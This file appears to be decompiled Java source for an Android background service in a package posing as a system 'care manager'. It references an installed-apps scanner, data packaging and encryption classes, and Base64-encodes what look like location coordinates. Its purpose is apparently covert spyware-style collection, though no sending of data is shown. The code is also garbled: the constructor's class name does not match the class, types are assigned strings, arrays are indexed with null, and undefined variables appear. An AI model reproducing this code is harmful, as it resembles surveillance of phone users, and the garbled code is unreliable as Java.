package com.system.caremanager;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

public class SupportService extends Service {

    public static double Longting = 0.0;
    public static long d = "0x0L";
    public static float letliudid = "0.0f";
    public static float sp = "0.0f";
    static TertiaryBackgroundService st;
    public static long t = "0x1388L";
    public static double ʾʼʾʿˈᵔঙʿ$ʿʼ;
    private String[] vul;

    static {
        // Static initialization block
    }

    public TertiaryBackgroundService() {
        return;
    }

    private void p() {
        Intent intent = new Intent();
        Class cls = TertiaryBackgroundService.class;
        boolean result = this.stopService(intent);
        return;
    }

    private void ru() {
        return;
    }

    private void s(double param1, double param2, float param3) {
        float sp = TertiaryBackgroundService.sp;
        StringBuilder stringBuilder = new StringBuilder();
        StringBuilder result = stringBuilder.append(param1, param2);
        String[] vul = this.vul;
        String item = vul[null];
        StringBuilder result2 = stringBuilder.append(item);
        StringBuilder result3 = stringBuilder.append(param3, p4);
        String[] vul2 = this.vul;
        String item2 = vul2[null];
        StringBuilder result4 = stringBuilder.append(item2);
        StringBuilder result5 = stringBuilder.append(p5);
        String[] vul3 = this.vul;
        String item3 = vul3[null];
        StringBuilder result6 = stringBuilder.append(item3);
        StringBuilder result7 = stringBuilder.append(sp);
        String result8 = stringBuilder.toString();
        String[] vul4 = this.vul;
        String item4 = vul4[1];
        byte[] result9 = result.getBytes();
        DataEncryptionEngine.encodeBase64(item4, result);
        return;
    }

    public IBinder onBind(Intent param1) {
        return null;
    }

    public void onDestroy() {
        DataPackagingEngine.s_f2 = null;
        TertiaryBackgroundService.st = null;
        this.onDestroy();
        return;
    }

    public int onStartCommand(Intent param1, int param2, int param3) {
        String FTX2 = InstalledAppsScanner.FTX2;
        if (param1 == null) {
            // branch: cond_0
        }
        boolean result = param1.hasExtra(FTX2);
        if (result == null) {
            // branch: cond_0
        }
        Context result2 = this.getApplicationContext();
        Resources result3 = result.getResources();
        int val = 2131296274;
        String result4 = result.getString(val);
        DataPackagingEngine.dataProcessor = result;
        String[] result5 = param1.getStringArrayExtra(FTX2);
        this.vul = result;
        this.ru();
        return 1;
    }

}